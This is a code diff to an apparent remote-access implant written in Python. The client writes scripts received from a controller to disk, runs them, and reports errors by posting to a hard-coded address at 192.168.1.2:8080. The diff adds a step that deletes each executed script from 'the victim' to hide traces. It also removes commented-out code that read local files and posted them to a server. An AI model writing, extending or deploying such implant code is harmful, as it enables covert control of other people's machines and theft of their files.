@@ -13,6 +13,7 @@ import traceback
 from mss import mss
 from os.path import isfile, join
 import ctypes
+import psutil
 
 
 def staging(identifier):
@@ -76,7 +77,7 @@ def handle_commands(response, identifier):
 		f.write(res['script'])
 		f.close()
 
-		## Execute teh script file
+		## Execute the script file
 		if os.path.isfile(save_path):
 
 			if language == 'python':
@@ -100,26 +101,15 @@ def handle_commands(response, identifier):
 		else:
 			## Some error happened while exexuting task, send some othe response code? TODO
 			pass
+
+		## Clean up the script we just created on the victim after execution
+		if os.path.isfile(save_path):
+			os.remove(save_path)
 	except:
 		## Some error happened while handling commands, sent the traceback to server back
 		url = 'http://192.168.1.2:8080/clienterror'
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
-
-
-		
-	## Exfiltration code
-	# for f in os.listdir('.'):
-	# 	if isfile(join('.', f)):
-	# 		print(f)
-	# 		## wb enables to read bianry
-	# 		content = open(f,"rb").read()
-
-	# 		## Sending out data
-	# 		url = 'http://0.0.0.0:8080'
-	# 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-	# 		custom_headers = {'filename':f}
-	# 		r = requests.post(url = url,cookies = cookies, headers = custom_headers, data = content)
 
 def main():
 	## Will identify the victim
